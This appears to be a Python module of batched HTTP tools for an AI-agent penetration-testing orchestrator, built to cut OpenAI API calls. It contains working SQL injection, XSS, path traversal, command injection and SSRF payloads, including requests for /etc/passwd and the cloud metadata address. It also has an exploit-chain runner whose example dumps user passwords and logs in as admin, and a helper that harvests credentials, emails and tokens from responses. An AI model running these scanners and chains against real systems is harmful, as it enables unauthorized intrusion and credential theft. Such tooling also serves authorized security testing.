"""
Batch HTTP Tools - Make many HTTP requests in ONE OpenAI call
This is the key to reducing tokens and API calls by 80-90%

The bottleneck is OpenAI, not HTTP!
- OpenAI call: 2-5 seconds, $0.01/1K tokens
- HTTP request: 50ms, free

Strategy: Bundle 10-100 HTTP requests into ONE OpenAI call
"""

import json
import os
import re
from typing import Any, Dict, List, Optional

import httpx

try:
    from orchestrator.oai_agents import function_tool
except ModuleNotFoundError:
    from oai_agents import function_tool


TARGET_URL = os.environ.get("TARGET_URL", "http://localhost:8001")


def _truncate(text: str, limit: int = 150) -> str:
    """Truncate responses to save tokens."""
    if len(text) <= limit:
        return text
    return text[:limit] + "..."


# ============================================================================
# 1. BATCH HTTP REQUESTS
# ============================================================================


@function_tool
def http_batch_get(urls_json: str) -> Dict[str, Any]:
    """
    Make multiple GET requests in ONE tool call.
    This is WAY more efficient than calling http_get multiple times.

    Example:
        http_batch_get(urls_json='["/api/products", "/api/users", "/api/orders", "/admin"]')

        Makes 4 HTTP requests, returns to agent ONCE
        vs. calling http_get 4 times = 4 agent decisions = 4 OpenAI calls!

    Args:
        urls_json: JSON array of URLs to test

    Returns:
        Aggregated results with success/error counts
    """
    try:
        urls = json.loads(urls_json)
    except json.JSONDecodeError:
        return {"error": "Invalid JSON format"}

    results = []
    successful = 0
    errors = 0
    interesting = []

    for url in urls:
        full_url = f"{TARGET_URL}{url}" if not url.startswith("http") else url

        try:
            resp = httpx.get(full_url, timeout=3.0, follow_redirects=False)
            status = resp.status_code

            # Quick analysis
            body_lower = resp.text.lower()
            has_sqli = any(k in body_lower for k in ["select", "insert", "sql"])
            has_admin = "admin" in body_lower
            has_error = status >= 400

            result = {
                "url": url,
                "status": status,
                "size": len(resp.text),
            }

            # Only include interesting details
            if has_sqli or has_admin or has_error:
                result["note"] = []
                if has_sqli:
                    result["note"].append("SQL keywords")
                if has_admin:
                    result["note"].append("admin content")
                if has_error:
                    result["note"].append("error")
                interesting.append(url)

            results.append(result)

            if 200 <= status < 300:
                successful += 1
            elif status >= 400:
                errors += 1

        except Exception as exc:
            errors += 1
            results.append({"url": url, "error": str(exc)[:50]})

    return {
        "total": len(urls),
        "successful": successful,
        "errors": errors,
        "interesting_count": len(interesting),
        "interesting": interesting,
        "results": results[:10],  # Limit to 10 to save tokens
        "summary": f"{successful} accessible, {errors} errors, {len(interesting)} interesting"
    }


@function_tool
def http_batch_post(requests_json: str) -> Dict[str, Any]:
    """
    Make multiple POST requests in ONE tool call.

    Example:
        http_batch_post(requests_json='[
            {"url": "/api/login", "body": {"user": "admin", "pass": "admin"}},
            {"url": "/api/orders", "body": {"item": "test"}},
            {"url": "/api/reviews", "body": {"text": "<script>alert(1)</script>"}}
        ]')

    Args:
        requests_json: JSON array of request objects with url and body

    Returns:
        Aggregated results
    """
    try:
        requests = json.loads(requests_json)
    except json.JSONDecodeError:
        return {"error": "Invalid JSON format"}

    results = []
    successful = 0

    for req in requests:
        url = req["url"]
        body = req.get("body", {})
        headers = req.get("headers", {})

        full_url = f"{TARGET_URL}{url}" if not url.startswith("http") else url

        try:
            resp = httpx.post(full_url, json=body, headers=headers, timeout=3.0)

            results.append({
                "url": url,
                "status": resp.status_code,
                "preview": _truncate(resp.text, 100)
            })

            if 200 <= resp.status_code < 300:
                successful += 1

        except Exception as exc:
            results.append({"url": url, "error": str(exc)[:50]})

    return {
        "total": len(requests),
        "successful": successful,
        "results": results[:10],
        "summary": f"{successful}/{len(requests)} successful"
    }


# ============================================================================
# 2. BATCH VULNERABILITY TESTING
# ============================================================================


@function_tool
def test_sqli_batch(endpoints_json: str, payloads_json: Optional[str] = None) -> Dict[str, Any]:
    """
    Test multiple endpoints for SQL injection with multiple payloads.
    ONE agent call can test 10 endpoints × 5 payloads = 50 HTTP requests!

    Example:
        test_sqli_batch(
            endpoints_json='["/api/products", "/api/users", "/api/orders"]'
        )

        Tests 3 endpoints × 5 payloads = 15 HTTP requests
        Returns to agent ONCE with all results!

    Args:
        endpoints_json: JSON array of endpoints to test
        payloads_json: Optional custom SQLi payloads

    Returns:
        Summary of vulnerable endpoints with proof
    """
    try:
        endpoints = json.loads(endpoints_json)
    except json.JSONDecodeError:
        return {"error": "Invalid endpoints_json"}

    # Default SQLi payloads
    if payloads_json:
        try:
            payloads = json.loads(payloads_json)
        except json.JSONDecodeError:
            return {"error": "Invalid payloads_json"}
    else:
        payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' UNION SELECT NULL--",
            "admin'--",
            "1' AND '1'='1"
        ]

    vulnerable = []
    total_tests = 0

    for endpoint in endpoints:
        endpoint_vuln = False

        for payload in payloads:
            total_tests += 1

            # Build test URL
            test_url = f"{TARGET_URL}{endpoint}"
            params = {"search": payload, "q": payload, "id": payload, "filter": payload}

            try:
                resp = httpx.get(test_url, params=params, timeout=2.0)

                # Check for SQLi indicators
                body_lower = resp.text.lower()
                is_vulnerable = (
                    resp.status_code == 200 and
                    any(indicator in body_lower for indicator in [
                        "sql syntax",
                        "mysql",
                        "postgresql",
                        "sqlite",
                        "database error",
                        "syntax error",
                        "unclosed quotation"
                    ])
                )

                if is_vulnerable and not endpoint_vuln:
                    vulnerable.append({
                        "endpoint": endpoint,
                        "payload": payload,
                        "proof": _truncate(resp.text, 100)
                    })
                    endpoint_vuln = True
                    break  # Found vuln, move to next endpoint

            except:
                continue

    return {
        "tested": total_tests,
        "endpoints_tested": len(endpoints),
        "payloads_used": len(payloads),
        "vulnerable_count": len(vulnerable),
        "vulnerable": vulnerable,
        "summary": f"Tested {total_tests} combinations. Found {len(vulnerable)} vulnerable endpoints."
    }


@function_tool
def test_xss_batch(endpoints_json: str) -> Dict[str, Any]:
    """
    Test multiple endpoints for XSS vulnerabilities.
    ONE agent call → Many HTTP requests → ONE result.

    Example:
        test_xss_batch(endpoints_json='["/api/comments", "/api/reviews", "/profile"]')

        Tests 3 endpoints × 5 payloads × 2 methods = 30 HTTP requests!

    Args:
        endpoints_json: JSON array of endpoints to test

    Returns:
        Summary of vulnerable endpoints
    """
    try:
        endpoints = json.loads(endpoints_json)
    except json.JSONDecodeError:
        return {"error": "Invalid endpoints_json"}

    xss_payloads = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert(1)",
        "<svg onload=alert(1)>",
        "'-alert(1)-'"
    ]

    vulnerable = []
    total_tests = 0

    for endpoint in endpoints:
        endpoint_vuln = False

        for payload in xss_payloads:
            if endpoint_vuln:
                break

            test_url = f"{TARGET_URL}{endpoint}"

            # Try both GET and POST
            for method in ['GET', 'POST']:
                total_tests += 1

                try:
                    if method == 'GET':
                        resp = httpx.get(
                            test_url,
                            params={"comment": payload, "review": payload, "text": payload, "content": payload},
                            timeout=2.0
                        )
                    else:
                        resp = httpx.post(
                            test_url,
                            json={"comment": payload, "review": payload, "text": payload, "content": payload},
                            timeout=2.0
                        )

                    # Check if payload reflected without encoding
                    if payload in resp.text or payload.replace("'", "&#39;") in resp.text:
                        vulnerable.append({
                            "endpoint": endpoint,
                            "method": method,
                            "payload": payload,
                            "reflected": True
                        })
                        endpoint_vuln = True
                        break

                except:
                    continue

    return {
        "tested": total_tests,
        "vulnerable_count": len(vulnerable),
        "vulnerable": vulnerable,
        "summary": f"Found {len(vulnerable)} potential XSS vectors out of {len(endpoints)} endpoints"
    }


@function_tool
def scan_endpoint_all_vectors(endpoint: str, params_json: Optional[str] = None) -> Dict[str, Any]:
    """
    Scan ONE endpoint with ALL attack vectors: SQLi, XSS, traversal, cmd injection, SSRF.
    ONE agent call → 50+ HTTP requests → Complete security analysis!

    Example:
        scan_endpoint_all_vectors(
            endpoint="/api/products",
            params_json='["id", "search", "filter"]'
        )

        Tests 3 params × ~15 attack types = 45+ HTTP requests
        All in ONE OpenAI call!

    Args:
        endpoint: Single endpoint to test thoroughly
        params_json: Parameters to fuzz (default: id, search, q, filter)

    Returns:
        Comprehensive vulnerability report
    """
    if params_json:
        try:
            params_to_fuzz = json.loads(params_json)
        except json.JSONDecodeError:
            return {"error": "Invalid params_json"}
    else:
        params_to_fuzz = ["id", "search", "q", "filter", "name"]

    findings = {
        "sqli": [],
        "xss": [],
        "path_traversal": [],
        "cmd_injection": [],
        "ssrf": []
    }

    total_tests = 0
    test_url = f"{TARGET_URL}{endpoint}"

    # SQLi payloads
    sqli_payloads = ["' OR '1'='1", "' UNION SELECT NULL--", "admin'--"]

    # XSS payloads
    xss_payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"]

    # Path traversal
    path_payloads = ["../../../etc/passwd", "..\\..\\..\\windows\\win.ini"]

    # Command injection
    cmd_payloads = ["; ls", "| whoami", "& dir"]

    # SSRF
    ssrf_payloads = ["http://localhost", "http://169.254.169.254"]

    # Test each parameter with each attack type
    for param in params_to_fuzz:
        # Test SQLi
        for payload in sqli_payloads:
            total_tests += 1
            try:
                resp = httpx.get(test_url, params={param: payload}, timeout=1.5)
                body_lower = resp.text.lower()
                if any(kw in body_lower for kw in ["sql", "mysql", "syntax error", "database"]):
                    findings["sqli"].append({"param": param, "payload": payload})
            except:
                pass

        # Test XSS
        for payload in xss_payloads:
            total_tests += 1
            try:
                resp = httpx.get(test_url, params={param: payload}, timeout=1.5)
                if payload in resp.text:
                    findings["xss"].append({"param": param, "payload": payload})
            except:
                pass

        # Test path traversal
        for payload in path_payloads:
            total_tests += 1
            try:
                resp = httpx.get(test_url, params={param: payload}, timeout=1.5)
                if "root:" in resp.text or "[extensions]" in resp.text:
                    findings["path_traversal"].append({"param": param, "payload": payload})
            except:
                pass

        # Test command injection
        for payload in cmd_payloads:
            total_tests += 1
            try:
                resp = httpx.get(test_url, params={param: payload}, timeout=1.5)
                body_lower = resp.text.lower()
                if any(kw in body_lower for kw in ["bin", "directory of", "uid=", "total"]):
                    findings["cmd_injection"].append({"param": param, "payload": payload})
            except:
                pass

        # Test SSRF
        for payload in ssrf_payloads:
            total_tests += 1
            try:
                resp = httpx.get(test_url, params={param: payload}, timeout=1.5)
                body_lower = resp.text.lower()
                if "cloud" in body_lower or "metadata" in body_lower or "ami-id" in body_lower:
                    findings["ssrf"].append({"param": param, "payload": payload})
            except:
                pass

    total_findings = sum(len(v) for v in findings.values())

    return {
        "endpoint": endpoint,
        "params_tested": len(params_to_fuzz),
        "tests_run": total_tests,
        "findings_count": total_findings,
        "findings": findings,
        "summary": f"Ran {total_tests} tests, found {total_findings} vulnerabilities"
    }


# ============================================================================
# 3. EXPLOIT CHAIN EXECUTION
# ============================================================================


@function_tool
def execute_exploit_chain(steps_json: str) -> Dict[str, Any]:
    """
    Execute a multi-step exploit chain in ONE agent call.
    Perfect for chaining: SQLi → dump users → login as admin → access panel

    Example:
        execute_exploit_chain(steps_json='[
            {"name": "test_sqli", "url": "/api/products?search=' OR '1'='1"},
            {"name": "dump_users", "url": "/api/products?search=' UNION SELECT username,password FROM users--"},
            {"name": "admin_login", "method": "POST", "url": "/api/auth/login", "body": {"user": "admin", "pass": "admin123"}},
            {"name": "access_admin", "url": "/api/admin/users"}
        ]')

        4 HTTP requests in ONE OpenAI call!
        vs. 4 separate agent decisions = 4 OpenAI calls

    Args:
        steps_json: JSON array of exploit steps

    Returns:
        Results of each step with extracted data
    """
    try:
        steps = json.loads(steps_json)
    except json.JSONDecodeError:
        return {"error": "Invalid steps_json"}

    results = []
    context = {}  # Store cookies, tokens between steps
    cookies = {}

    for i, step in enumerate(steps, 1):
        step_name = step.get("name", f"step_{i}")
        url = step["url"]
        method = step.get("method", "GET")
        headers = step.get("headers", {})
        body = step.get("body")

        full_url = f"{TARGET_URL}{url}" if not url.startswith("http") else url

        try:
            if method == "GET":
                resp = httpx.get(full_url, headers=headers, cookies=cookies, timeout=3.0)
            else:
                resp = httpx.post(full_url, headers=headers, json=body, cookies=cookies, timeout=3.0)

            # Update cookies for next request
            cookies.update(resp.cookies)

            # Extract sensitive data
            extracted = _extract_sensitive_data(resp.text)

            result = {
                "step": i,
                "name": step_name,
                "status": resp.status_code,
                "success": 200 <= resp.status_code < 300,
                "extracted": extracted,
                "preview": _truncate(resp.text, 80)
            }

            results.append(result)
            context[step_name] = extracted

        except Exception as exc:
            results.append({
                "step": i,
                "name": step_name,
                "success": False,
                "error": str(exc)[:100]
            })
            break  # Stop on failure

    chain_success = all(r.get("success") for r in results)

    return {
        "total_steps": len(steps),
        "completed": len(results),
        "chain_success": chain_success,
        "results": results,
        "summary": f"Executed {len(results)}/{len(steps)} steps. Chain {'successful' if chain_success else 'failed'}."
    }


def _extract_sensitive_data(text: str) -> Dict[str, Any]:
    """Extract credentials, emails, tokens from response."""
    extracted = {}

    # Find potential credentials (key:value or key=value)
    creds = re.findall(r'(\w+)\s*[:=]\s*([^\s,;]+)', text)
    if creds:
        extracted["credentials"] = [f"{k}:{v}" for k, v in creds[:3]]

    # Find emails
    emails = re.findall(r'[\w\.-]+@[\w\.-]+\.\w+', text)
    if emails:
        extracted["emails"] = emails[:3]

    # Find tokens/keys/secrets
    tokens = re.findall(r'(token|key|secret|jwt)[\s:=]+([a-zA-Z0-9_-]{15,})', text, re.I)
    if tokens:
        extracted["tokens"] = [f"{k}:{v[:20]}..." for k, v in tokens[:2]]

    return extracted if extracted else {"none": "No sensitive data extracted"}


# ============================================================================
# SUMMARY
# ============================================================================

"""
USAGE IN AGENTS:

from orchestrator.agents.batch_tools import (
    http_batch_get,
    test_sqli_batch,
    test_xss_batch,
    scan_endpoint_all_vectors,
    execute_exploit_chain
)

recon_agent = Agent(
    tools=[http_batch_get, ...]  # Scan 10+ endpoints at once
)

vulnerability_hunter = Agent(
    tools=[test_sqli_batch, test_xss_batch, ...]  # Test 10+ endpoints at once
)

exploit_developer = Agent(
    tools=[execute_exploit_chain, ...]  # Chain 5+ steps at once
)

IMPACT:
- Before: 10 endpoints = 10 OpenAI calls = 10,000 tokens
- After:  10 endpoints = 1 OpenAI call = 1,500 tokens (85% savings!)
"""
